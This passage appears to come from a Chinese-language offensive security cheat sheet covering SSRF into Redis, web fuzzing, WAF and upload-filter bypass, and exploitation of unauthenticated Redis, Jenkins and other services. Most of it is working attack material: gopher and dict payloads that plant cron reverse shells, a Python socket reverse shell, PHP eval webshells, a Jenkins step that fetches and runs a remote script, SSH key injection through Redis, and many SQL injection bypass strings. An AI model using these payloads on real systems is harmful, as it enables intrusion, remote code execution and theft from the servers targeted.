</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/18.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/19.png~webp" alt="image"></p>
<pre><code>将捕获日志保存txt
使用脚本转换为支持gopher协议的字符串
转换规则
如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。
如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。
将\r字符串替换成%0d%0a
空白行替换为%0a
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/20.png~webp" alt="image"></p>
<pre><code>本地可执行
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/21.png~webp" alt="image"></p>
<pre><code>远程执行需对空格进行编码后再url编码一次
*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/192.168.0.108/12138%200&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/22.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/23.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/24.png~webp" alt="image"></p>
<h6 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h6><pre><code>Curl版本需低于7.15.1
file:可回显时，使用file读取任意文件
dict:查看端口，操作内网服务
gopher:可发出get/post请求
使用gopher协议时，要进行两次url编码
http/https:探测存活主机
</code></pre><h6 id="dict协议写shell"><a href="#dict协议写shell" class="headerlink" title="dict协议写shell"></a>dict协议写shell</h6><pre><code>?url=dict://127.0.0.1:6379/set:x:&lt;?php phpinfo();?&gt;
?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/
?url=dict://127.0.0.1:6379/config:set:dbfilename:php.php
?url=dict://127.0.0.1:6379/save
Unicode编码
?url=dict://127.0.0.1:6379/set:x:&quot;\x3C\x3Fphp\x20echo `$_GET[x]`\x3B\x3F\x3E&quot;
</code></pre><h6 id="slaveof复制shell到目标"><a href="#slaveof复制shell到目标" class="headerlink" title="slaveof复制shell到目标"></a>slaveof复制shell到目标</h6><pre><code>From:http://r3start.net/index.php/2020/05/09/683
你的redis设置一个shell的键
Yourredis&gt;FLUSHALL
Yourredis&gt;set shell &quot;&lt;?php phpinfo();?&gt;&quot;
?url=dict://127.0.0.1:6379/slaveof:yourredisIP:6379
?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/
?url=dict://127.0.0.1:6379/config:set:dbfilename:test.php
?url=dict://127.0.0.1:6379/save
?url=dict://127.0.0.1:6379/slaveof:no:one
</code></pre><h6 id="slaveof反弹shell"><a href="#slaveof反弹shell" class="headerlink" title="slaveof反弹shell"></a>slaveof反弹shell</h6><pre><code>?url=dict://127.0.0.1:6379/slaveof: yourredisIP:6379
?url=dict://127.0.0.1:6379/config:set:dbfilename:exp.so
?url=dict://127.0.0.1:6379/MODULE:LOAD:./exp.so
?url=dict://127.0.0.1:6379/SLAVEOF:NO:ONE
?url=dict://127.0.0.1:6379/config:set:dbfilename:dump.rdb
?url=dict://127.0.0.1:6379/system.exec:&#39;curl x.x.x.x/x&#39;
?url=dict://127.0.0.1:6379/system.rev:x.x.x.x:8887
</code></pre><h4 id="Fuzz-扫描web"><a href="#Fuzz-扫描web" class="headerlink" title="Fuzz/扫描web"></a>Fuzz/扫描web</h4><pre><code>#dirb http://192.168.0.1 /root/asp.txt,/root/dir.txt -a &quot;USER-AGENT&quot; –c &quot;Cookie&quot; -z 100
#nikto -C all -h http://192.168.0.107 nikto扫描web服务
#wpscan --url http://192.168.0.107/ -e u --wordlist /root/wordlist.txt 枚举用户爆破密码
#wpscan --url http://192.168.0.107/ -e vp 扫描漏洞插件
#perl joomscan.pl --url 192.168.0.107
</code></pre><h5 id="WFuzz"><a href="#WFuzz" class="headerlink" title="WFuzz"></a>WFuzz</h5><pre><code>爆破文件和文件夹
&gt;wfuzz -w wordlist URL/FUZZ.php
&gt;wfuzz -w wordlist URL/FUZZ
枚举数字参数
&gt;wfuzz -z range,000-999 -b session=session -b cookie=cookie http://127.0.0.1/getuser.php?uid=FUZZ
POST账号密码爆破FUZnZ
&gt;wfuzz -w userList -w pwdList -d &quot;username=FUZZ&amp;password=FUZ2Z&quot; http://127.0.0.1/login.php
随机HTTP头
&gt;wfuzz -z range,0000-9999 -H &quot;X-Forwarded-For: FUZZ&quot; http://127.0.0.1/get.php?userid=666
使用代理fuzz
&gt;wfuzz -w wordlist -p 127.0.0.1:1087:SOCKS5 URL/FUZZ
基础认证爆破
&gt;wfuzz -z list,&quot;username-password&quot; --basic FUZZ:FUZZ URL
【结果过滤】--hc或--ss不显示符合条件的结果。
【结果过滤】--sc或--sl或--sw或--sh显示符合条件的结果。
</code></pre><h5 id="Cewl"><a href="#Cewl" class="headerlink" title="Cewl"></a>Cewl</h5><pre><code>爬行网站存为字典
&gt;cewl http://www.qq.com/ -w dict.txt
指定字典长度
&gt;cewl http://www.qq.com/ -m 9 -w dict.txt
网站提取Email
&gt;cewl http://www.qq.com/ -n –e
</code></pre><h5 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h5><pre><code>&gt;python3 dirsearch.py --random-user-agents --recursive --thread 50 --extension php --plain-text-report report.txt –url http://127.0.0.1
</code></pre><h4 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h4><h5 id="SQL注入分块传输"><a href="#SQL注入分块传输" class="headerlink" title="SQL注入分块传输"></a>SQL注入分块传输</h5><pre><code>https://github.com/c0ny1/chunked-coding-converter
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/25.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/26.png~webp" alt="image"></p>
<pre><code>跑注入点被拦截
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/27.png~webp" alt="image"></p>
<pre><code>使用分块传输，右键选择
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/28.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/30.png~webp" alt="image"></p>
<pre><code>使用SQLMAP跑注入
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/31.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/32.png~webp" alt="image"></p>
<pre><code>&gt;python sqlmap.py -r 1.txt --batch --proxy=http://127.0.0.1:8080 --dbs
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/33.png~webp" alt="image"></p>
<h5 id="自动提供可用的tamper"><a href="#自动提供可用的tamper" class="headerlink" title="自动提供可用的tamper"></a>自动提供可用的tamper</h5><pre><code>https://github.com/m4ll0k/Atlas
GET类型的注入
python atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v
POST类型的注入
python atlas.py --url http://site.com/index/id/ -m POST -D &#39;test=%%10%%&#39; --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v
请求头注入
python atlas.py --url http://site.com/index/id/ -H &#39;User-Agent: mozilla/5.0%%inject%%&#39; -H &#39;X-header: test&#39; --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v
组合tamper
python atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --concat &quot;equaltolike,htmlencode&quot; --random-agent -v
列出tamper
python atlas.py -g
例子
注入
python sqlmap.py -u &#39;http://site.com/index.php?id=Price_ASC&#39; --dbs --random-agent -v 3
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/658.png~webp" alt="image"></p>
<pre><code>可以看到被拦截了
查找能绕过的tamper
python atlas.py --url &#39;http://site.com/index.php?id=Price_ASC&#39; --payload=&quot;&#39;) AND 8716=4837 AND (&#39;yajr&#39;=&#39;yajr&quot; --random-agent -v
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/659.png~webp" alt="image"></p>
<pre><code>根据返回码200得到一个可绕过waf的tamper
versionedkeywords这个tamper
继续注入
python sqlmap.py -u &#39;http://site.com/index.php?id=Price_ASC&#39; --dbs --random-agent -v 3 --tamper=versionedkeywords
根据状态码来判断有时会有点鸡肋，但是也能用用，随机发挥吧。
</code></pre><h5 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h5><pre><code>#coding=utf-8
import random,string
from urllib import parse
# code by yzddMr6
varname_min = 5
varname_max = 15
data_min = 20
data_max = 25
num_min = 50
num_max = 100
def randstr(length):
    str_list = [random.choice(string.ascii_letters) for i in range(length)]
    random_str = &#39;&#39;.join(str_list)
    return random_str
def main():
    data=&#123;&#125;
    for i in range(num_min,num_max):
        data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))
    print(&#39;&amp;&#39;+parse.urlencode(data)+&#39;&amp;&#39;)
main()
放到要注入的字段前后
</code></pre><h5 id="上传bypass"><a href="#上传bypass" class="headerlink" title="上传bypass"></a>上传bypass</h5><h6 id="图片文件头"><a href="#图片文件头" class="headerlink" title="图片文件头"></a>图片文件头</h6><pre><code>PNG 的文件头为十六进制的 89 50 4E 47 0D 0A 1A 0A
GIF 为 47 49 46 38 37 61
JPG 为 FF D8 FF E0
</code></pre><h6 id="添加图片头或合并图片包含"><a href="#添加图片头或合并图片包含" class="headerlink" title="添加图片头或合并图片包含"></a>添加图片头或合并图片包含</h6><h6 id="后缀大小写"><a href="#后缀大小写" class="headerlink" title="后缀大小写"></a>后缀大小写</h6><h6 id="文件名前缀加-0x09"><a href="#文件名前缀加-0x09" class="headerlink" title="文件名前缀加[0x09]"></a>文件名前缀加[0x09]</h6><h6 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传.htaccess"></a>上传.htaccess</h6><pre><code>SetHandler application/x-httpd-php
</code></pre><h6 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h6><pre><code>GIF
找好一个大一点的GIF，尾部使用c32插入shell，上传，下载回来，使用burp的comparer功能找出整个文件没有被渲染的位置，插入shell再上传
JPG
使用脚本直接生成
https://github.com/BlackFan/jpg_payload
PNG
使用脚本直接生成
先取消php.ini注释;extension=php_gd2.dll
&lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
       0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
       0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
       0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
       0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
       0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
       0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
       0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;
    $r = $p[$y];
    $g = $p[$y+1];
    $b = $p[$y+2];
    $color = imagecolorallocate($img, $r, $g, $b);
    imagesetpixel($img, round($y / 3), 0, $color);
&#125;
imagepng($img,&#39;./1.png&#39;);
?&gt;
</code></pre><h6 id="上传php3-php4-phtml等"><a href="#上传php3-php4-phtml等" class="headerlink" title="上传php3,php4,phtml等"></a>上传php3,php4,phtml等</h6><h6 id="文件名后加-DATA"><a href="#文件名后加-DATA" class="headerlink" title="文件名后加::$DATA"></a>文件名后加::$DATA</h6><pre><code>ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;1.asp::$DATA&quot;
ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;1.asp::$DATA\0x00\1.asp0x00.jpg&quot;
</code></pre><h6 id="asp-空格"><a href="#asp-空格" class="headerlink" title="asp . (空格+.)"></a>asp . (空格+.)</h6><h6 id="php-点-空格-点"><a href="#php-点-空格-点" class="headerlink" title="php. .(点+空格+点)"></a>php. .(点+空格+点)</h6><h6 id="双写phphpp"><a href="#双写phphpp" class="headerlink" title="双写phphpp"></a>双写phphpp</h6><h6 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h6><pre><code>Get参数00截断直接添加%00
POST参数00截断修改hex为00
</code></pre><h6 id="修改一些固定的参数"><a href="#修改一些固定的参数" class="headerlink" title="修改一些固定的参数"></a>修改一些固定的参数</h6><h6 id="文件名去掉双引号"><a href="#文件名去掉双引号" class="headerlink" title="文件名去掉双引号"></a>文件名去掉双引号</h6><h6 id="加一个filename1的参数"><a href="#加一个filename1的参数" class="headerlink" title="加一个filename1的参数"></a>加一个filename1的参数</h6><h6 id="form变量改成f-orm"><a href="#form变量改成f-orm" class="headerlink" title="form变量改成f+orm"></a>form变量改成f+orm</h6><h6 id="去掉form-data"><a href="#去掉form-data" class="headerlink" title="去掉form-data"></a>去掉form-data</h6><h6 id="在Content-Disposition或form-data-后添加多个空格"><a href="#在Content-Disposition或form-data-后添加多个空格" class="headerlink" title="在Content-Disposition或form-data;后添加多个空格"></a>在Content-Disposition或form-data;后添加多个空格</h6><h6 id="引号回车"><a href="#引号回车" class="headerlink" title="引号回车"></a>引号回车</h6><pre><code>ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;backlion.asp
&quot;
</code></pre><h6 id="Content-Type和ConTent-Disposition调换位置"><a href="#Content-Type和ConTent-Disposition调换位置" class="headerlink" title="Content-Type和ConTent-Disposition调换位置"></a>Content-Type和ConTent-Disposition调换位置</h6><h6 id="文件名前缀加空格"><a href="#文件名前缀加空格" class="headerlink" title="文件名前缀加空格"></a>文件名前缀加空格</h6><pre><code>filename=    &quot;1.asp&quot;
</code></pre><h6 id="name前加空格"><a href="#name前加空格" class="headerlink" title="name前加空格"></a>name前加空格</h6><pre><code>Content-Disposition: form-data;      name=&quot;uploaded&quot;; filename=&quot;1.asp&quot;
</code></pre><h6 id="form-data的前后加上"><a href="#form-data的前后加上" class="headerlink" title="form-data的前后加上+"></a>form-data的前后加上+</h6><pre><code>Content-Disposition: +form-data; name=&quot;filepath&quot;; filename=&quot;1.asp&quot;
</code></pre><h5 id="ASP-IIS"><a href="#ASP-IIS" class="headerlink" title="ASP+IIS"></a>ASP+IIS</h5><pre><code>s%elect&gt;select
s%u0065lect&gt;select  
s%u00f0lect&gt;select
s%u0045lect = s%u0065lect = %u00f0lect
u --&gt;%u0055 --&gt; %u0075
n --&gt;%u004e --&gt; %u006e
i --&gt;%u0049 --&gt; %u0069
o --&gt;%u004f --&gt; %u006f --&gt;%u00ba
s --&gt;%u0053 --&gt; %u0073
l --&gt;%u004c --&gt; %u006c
e --&gt;%u0045 --&gt; %u0065--&gt;%u00f0
c --&gt;%u0043 --&gt; %u0063
t --&gt;%u0054 --&gt;%u0074 --&gt;%u00de --&gt;%u00fe
f --&gt;%u0046 --&gt;%u0066
r --&gt;%u0052 --&gt;%u0072
m --&gt;%u004d --&gt;%u006d
</code></pre><h5 id="Asp-iis-amp-aspx-iis"><a href="#Asp-iis-amp-aspx-iis" class="headerlink" title="Asp+iis&amp;aspx+iis"></a>Asp+iis&amp;aspx+iis</h5><pre><code>s%u006c%u0006ect&gt;select
</code></pre><h5 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h5><pre><code>TEST /sql.php?id=1 HTTP/1.1
</code></pre><h5 id="大小写-关键字"><a href="#大小写-关键字" class="headerlink" title="大小写/关键字"></a>大小写/关键字</h5><pre><code>UniOn SeLECT
Mid()substring()  substr()
Hex()ascii()
sleep() =benchmark()
concat_ws()=group_concat()
</code></pre><h5 id="双重url编码"><a href="#双重url编码" class="headerlink" title="双重url编码"></a>双重url编码</h5><h5 id="变换请求方式"><a href="#变换请求方式" class="headerlink" title="变换请求方式"></a>变换请求方式</h5><h5 id="HPP参数污染"><a href="#HPP参数污染" class="headerlink" title="HPP参数污染"></a>HPP参数污染</h5><pre><code>id=1&amp;id=2&amp;id=3
得到的结果：Asp.net + iis：id=1,2,3 
Asp+iis：id=1,2,3 
Php+apache：id=3
MSSQL:
GET+POST: 
GET:http://192.168.125.140/test/sql.aspx?id=1 union/*
post:  id=2*/select null,null,null
无逗号形式：
?id=1 union select 1&amp;id=2&amp;id=3&amp;id=4 from admin--（）  
利用逗号：
?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--
无效参数形式：
?a=/*&amp;sql=xxx&amp;b=*/  a,b为无效参数
溢出形式：?id=1/*&amp;id=*//*&amp;id=*//*......&amp;id=*//*&amp;id=*/ union  select null,system_user,null from INFORMATION_SCHEMA.schemata
MYSQL：
?id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=….. &amp;id=1 union select 1,2 from admin
</code></pre><h5 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库"></a>数据库</h5><h6 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h6><pre><code>空格符
%09、%0a、%0c、%0d、%16
</code></pre><h6 id="Mysql-1"><a href="#Mysql-1" class="headerlink" title="Mysql"></a>Mysql</h6><pre><code>注释符
#、/*...*/、--[空格] ...
空格符
[0x09,0x0a-0x0d,0x20,0xa0]
特殊符号
%a 换行符，可结合注释符使用%23%0a，%2d%2d%0a。
%21  ！ 叹号
%2b  +  加号
%2d  -  减号
%40  @  符号
%7e   ~  波浪号
Id=1 union select(1),user()
Id=1 union /!12345select/1,user()
Id=1 union select@1,user()
Id=1 union select &#123;x 1&#125;,user()
Id=1 union select&quot;1&quot;,user()
Id=1 union select\N,user()
Id=1 union select 1,user()`
Id=1 union select 1,user()&quot;&quot;
Id=1 union select 1,user()A
Id=1 union select 1,user()`b
Id=1 union(select 1,(select/!schema_name/from information_schema.SCHEMATA limit 1,1))
Id=1 union(select 1,(select&#123;x schema_name&#125;from information_schema.SCHEMATA limit 1,1))
Id=1 union(select 1,(select(schema_name)from information_schema.SCHEMATA limit 1,1))
浮点数
Id= 1.0union select 1,user()
Id= 1.union select 1,user()
Id= 1E0union select 1,user()
Id=\Nunion select 1,user()
Id=1 unionselect user(),2.0from admin
Id=1 union select user(),8e0from admin
Id=1 union select user(),\Nfrom admin
内联注释
/*!UnIon12345SelEcT*/ 1,user()   //数字范围 1000-50540
mysql黑魔法
select&#123;x username&#125;from &#123;x11 test.admin&#125;;
函数
截取
Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)) 
连接
concat(version(),&#39;|&#39;,user());
concat_ws(&#39;|&#39;,1,2,3)
字符转换
Ascii() Char() Hex() Unhex()
过滤逗号
127&#39; UNION SELECT * FROM ((SELECT1)a JOIN (SELECT2)b JOIN (SELECT3)c JOIN (SELECT4)d JOIN (SELECT5)e)# 
相当于 union select 1,2,3,4,5
union select * from (select 1)a join(select&#123;x schema_name&#125; from information_schema.SCHEMATA limit 1,1)b
limit 1 offset 0相当于limit 1,0
mid(version() from 1 for 1)相当于Mid(version(),1,1)
&lt;&gt;被过滤
id=1 and ascii(substr(database(),0,1))&gt;64
比较符
greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值
id=1 and greatest(ascii(substr(database(),0,1)),64)=64
函数构造
sleep(5)/benchmark(10000000,SHA1(1))
id=1 xor sleep%23%0a(5)
id=1 xor sleep%2d%2d%0a(5)
id=1 xor sleep([%20]5) 
id=1 xor benchmark%0a(10000000,SHA1(1))
id=1 xor sleep[空白字符](5)
select&#123;x[可填充字符]1&#125;
</code></pre><h6 id="MSSQL-1"><a href="#MSSQL-1" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>注释符
/*、--、;00%、/**/
空格符
[0x01-0x20][0x0a-0x0f][0x1a-0x-1f]
特殊符号
%3a 冒号
id=1 union:select 1,2 from:admin
id=1 union select+1,&#39;2&#39;,db_name() from admin
id=1 union select-1,&#39;2&#39;,db_name() from admin
id=1 union select.1,&#39;2&#39;,db_name() from admin
id=1 union select:1,&#39;2&#39;,db_name() from admin
id=1 union select~1,&#39;2&#39;,db_name() from admin
id=1%20union%20select%201,&#39;2&#39;,db_name()%80from%20admin
id=1 union select 1,&#39;2&#39;,db_name+() from admin
函数变形: db_name[空白字符]()
浮点数
id=1.1union select 1,&#39;2&#39;,db_name()
id=1e0union select 1,&#39;2&#39;,db_name()
运算符
id=1-1union select &#39;1&#39;,system_user,3 from admin
id=1e-union select &#39;1&#39;,system_user,3 from admin
字符串截取函数
Substring(@@version,1,1)
Left(@@version,1)
Right(@@version,1)
charindex(&#39;test&#39;,db_name())
字符串转换函数
Ascii(&#39;a&#39;)=char(97) 括号之间可添加空格
</code></pre><h5 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h5><pre><code>同时提交GET和POST
访问HTTP绕过对HTTPS的防护
%00截断
参数填充垃圾数据，缓冲区溢出
X-FORWARDED-FOR伪造绕过
静态文件/sql.php/1.js?id=1绕过
白名单绕过，URL只要存在某字符就不会拦截
/sql.php/admin.php?id=1
/sql.php?a=/manage/&amp;b=../etc/passwd
/../../../manage/../sql.asp?id=2
伪造User-agent绕过，可改为爬虫agent
</code></pre><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><h5 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h5><h6 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h6><pre><code>&gt;redis-cli -h 127.0.0.1 flunshall 
192.168.0.110:6379&gt;ping
PONG 存在未授权访问
</code></pre><h6 id="JS打内网"><a href="#JS打内网" class="headerlink" title="JS打内网"></a>JS打内网</h6><pre><code>var cmd = new XMLHttpRequest();      
cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);      
cmd.send(&#39;flushall\r\n&#39;);             
var cmd =new XMLHttpRequest();      
cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);      
cmd.send(&#39;eval \&#39;&#39; + &#39;redis.call(\&quot;set\&quot;,\&quot;1\&quot;,\&quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp;/dev/tcp/外网IP/5566 0&gt;&amp;1\\n\\n&quot;);redis.call(\&quot;config\&quot;, \&quot;set\&quot;, \&quot;dir\&quot;,\&quot;/var/spool/cron/\&quot;); redis.call(\&quot;config\&quot;,\&quot;set\&quot;, \&quot;dbfilename\&quot;, \&quot;root\&quot;);&#39; + &#39;\&#39; 0&#39; +&quot;\r\n&quot;);       
var cmd =new XMLHttpRequest();      
cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);       
cmd.send(&#39;save\r\n&#39;);
</code></pre><h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><pre><code>保存为sh
echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12138 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
echo -e &quot;\n\n */1 * * * * python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.108&quot;,12138));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
执行
&gt;bash 1.sh 192.168.0.120 6379
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/34.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/35.png~webp" alt="image"></p>
<h6 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h6><pre><code>6379&gt; config set dir /var/www/html/
6379&gt; config set dbfilename shell.php
6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;
6379&gt; save
</code></pre><h6 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h6><pre><code>ssh-keygen
本地生成一对密钥
https://github.com/JoyChou93/hackredis
&gt;ssh-keygen -t rsa -C &quot;xx@xx.com&quot;
&gt;(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; qq.txt
&gt;redis-cli -h 127.0.0.1 flunshall
&gt;cat qq.txt | redis-cli -h 127.0.0.1 -x set crackit
&gt;redis-cli -h 127.0.0.1
6379&gt; config set dir /root/.ssh/
6379&gt; config set dbfilename &quot;authorized_keys&quot;
6379&gt; save
本地登录
#ssh -i id_rsa root@11.11.11.11
</code></pre><h6 id="redis-rogue-getshell"><a href="#redis-rogue-getshell" class="headerlink" title="redis-rogue-getshell"></a>redis-rogue-getshell</h6><pre><code>https://github.com/vulhub/redis-rogue-getshell
需要python3.0以上
编译
&gt;cd RedisModulesSDK/
&gt;make
会在此目录下生成exp.so
执行命令
&gt;python3 redis-master.py -r 192.168.0.120 -p 6379 -L 192.168.0.108 -P 12138 -f RedisModulesSDK/exp.so -c &quot;cat /etc/passwd&quot;
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/36.png~webp" alt="image"></p>
<h6 id="redis-rogue-server"><a href="#redis-rogue-server" class="headerlink" title="redis-rogue-server"></a>redis-rogue-server</h6><pre><code>https://github.com/n0b0dyCN/redis-rogue-server
需要python3.6以上
编译
&gt;cd RedisModulesSDK/exp
&gt;make
执行
&gt;./redis-rogue-server.py --rhost 192.168.0.120 --lhost 192.168.0.108
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/37.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/38.png~webp" alt="image"></p>
<pre><code>也可以反向shell
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/39.png~webp" alt="image"><br><img src="https://qiniucdn.rhinelab.top/img/20220214/40.png~webp" alt="image"></p>
<h6 id="redis在windows下的利用"><a href="#redis在windows下的利用" class="headerlink" title="redis在windows下的利用"></a>redis在windows下的利用</h6><pre><code>Web目录写入木马
启动项
系统DLL劫持(目标重启或注销)
特定软件的DLL劫持
覆盖快捷方式
覆盖配置文件
覆盖sethc等文件
https://github.com/r35tart/RedisWriteFile
&gt;python3 rediswritefile.py --rhost=目标IP --rport=6379 --lhost=本机IP --lport=本地端口 --rpath=&quot;在目标保存的路径&quot; --rfile=&quot;在目标保存的文件&quot; --lfile=&quot;本地文件&quot; --auth=redis密码
</code></pre><h6 id="Lua-RCE"><a href="#Lua-RCE" class="headerlink" title="Lua RCE"></a>Lua RCE</h6><pre><code>https://github.com/QAX-A-Team/redis_lua_exploit
修改redis_lua.py里的 host 为目标 IP
执行返回正常，反弹shell
&gt;eval &quot;tonumber(&#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12345 0&gt;&amp;1&#39;, 8)&quot; 0
</code></pre><h5 id="Jenkins未授权访问"><a href="#Jenkins未授权访问" class="headerlink" title="Jenkins未授权访问"></a>Jenkins未授权访问</h5><pre><code>http://www.qq.com:8080/manage
http://www.qq.com:8080/script
执行命令
&gt;println &quot;ifconfig -a&quot;.execute().text
反弹shell
&gt;println &quot;wget http://your.com/back.py -P /tmp/&quot;.execute().text
&gt;println &quot;python /tmp/back.py yourIP 8080&quot;.execute().text
写shell
&gt;println &quot;wget http://your.com/t.txt -o /var/www/html/1.php&quot;.execute().text
&gt;new File(&quot;/var/www/html/1.php&quot;).write(&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;);
&gt;def webshell = &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;
&gt;new File(&quot;/var/www/html/1.php&quot;).write(&quot;$webshell&quot;);
</code></pre><h5 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h5><pre><code>默认端口27017直接连接进行增删改查
连接工具
https://s3.mongobooster.com/download/releasesv5/nosqlbooster4mongo-5.1.12.exe
</code></pre><h5 id="ZooKeeper未授权访问"><a href="#ZooKeeper未授权访问" class="headerlink" title="ZooKeeper未授权访问"></a>ZooKeeper未授权访问</h5><pre><code>默认端口2181
获得服务器环境信息
&gt;echo envi|nc 192.168.0.1 2181
连接
&gt;./zkCli.sh -server ip:port
连接工具
https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip
</code></pre><h5 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h5><pre><code>默认端口9200
http://1.1.1.1:9200/_plugin/head/
http://1.1.1.1:9200/_nodes
http://1.1.1.1:9200/_river
http://1.1.1.1:9200/_plugin/sql/
</code></pre><h5 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title="Memcache未授权访问"></a>Memcache未授权访问</h5><pre><code>默认端口11211
&gt;telnet 1.1.1.1 11211
&gt;nc -vv 1.1.1.1 11211
